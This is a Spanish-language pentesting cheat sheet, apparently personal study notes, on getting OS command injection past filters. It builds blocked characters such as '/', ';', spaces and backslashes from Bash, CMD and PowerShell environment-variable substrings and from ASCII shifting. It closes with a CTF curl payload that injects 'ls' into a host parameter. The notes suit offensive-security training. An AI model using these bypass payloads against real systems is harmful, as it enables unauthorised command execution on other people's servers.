---
aliases: null
tags:
  - type/technique
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[OS Command Injection]]'
---
# Command Injection - Generación de Caracteres Bloqueados

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `${PATH:0:1}` | Genera `/` desde la variable `$PATH` (Linux) | `/` bloqueado por filtro, necesitás paths absolutos. |
| `${LS_COLORS:10:1}` | Genera `;` desde `$LS_COLORS` | `;` bloqueado, necesitás encadenar comandos. |
| `${HOME:0:1}` | Genera `/` (alternativa a PATH) | `$PATH` no tiene `/` al inicio (raro). |
| `${IFS%??}` o `${IFS:0:1}` | Genera espacio/tab | Filtro bloquea espacios pero deja `$IFS`. |
| `$(tr '!-}' '"-~'<<<[)` | Genera `\` desplazando ASCII +1 desde `[` | Backslash bloqueado, ningún char `\` en env vars. |
| `$(tr '!-}' '"-~'<<<X)` | Genera `Y` (+1 ASCII) — generaliza para cualquier char | Necesitás un char específico, sin var con él. |
| `%HOMEPATH:~6,-11%` | Windows CMD — extrae `\` de `%HOMEPATH%` (`\Users\user`) | Backslash bloqueado en CMD. |
| `%TEMP:~-3,-2%` | Extrae un char específico por offset desde el final | Windows CMD substring tricks. |
| `$env:HOMEPATH[0]` | PowerShell — array indexing extrae char 0 (`\`) | Windows PS, sintaxis más limpia que CMD. |
| `printenv` (Linux) o `Get-ChildItem Env:` (Windows PS) | Lista todas las env vars | **Reconocimiento previo** — buscar qué chars tenés disponibles. |
^ci-caracteres-bloqueados

### Workflow

```bash
# Linux — listar env vars buscando chars necesarios
printenv | grep -F '/' | head    # busca vars con '/'
printenv | grep -F ';' | head    # busca vars con ';'

# Una vez encontrada, contar offset
echo $PATH       # /usr/local/sbin:/usr/local/bin:...
echo ${PATH:0:1} # /
echo ${PATH:4:1} # /  (después de /usr)

# Sintaxis var substring:
#   Linux Bash:  ${VAR:inicio:largo}
#   Windows CMD: %VAR:~inicio,fin%   (fin negativo cuenta desde atrás)
```

### Generar char con ASCII shifting

```bash
# Para char X, buscar el anterior en ASCII y shiftear +1
# Ejemplo: necesito '\' (92), busco '[' (91)
man ascii | grep -E '^\s+(91|92)'
echo $(tr '!-}' '"-~'<<<[)
# → \

# Generaliza: tr maps each char in input range to next char in output range
# '!-}' es ASCII 33-125 (input)
# '"-~' es ASCII 34-126 (output, shift +1)
```

### Ejemplo en CTF real

Filtro bloquea `;`. Encontraste `;` en `$LS_COLORS` offset 10:

```bash
# Original: 127.0.0.1; ls
# Payload:  127.0.0.1${LS_COLORS:10:1}${IFS}ls
curl "https://target/?host=127.0.0.1\${LS_COLORS:10:1}\${IFS}ls"
```

---
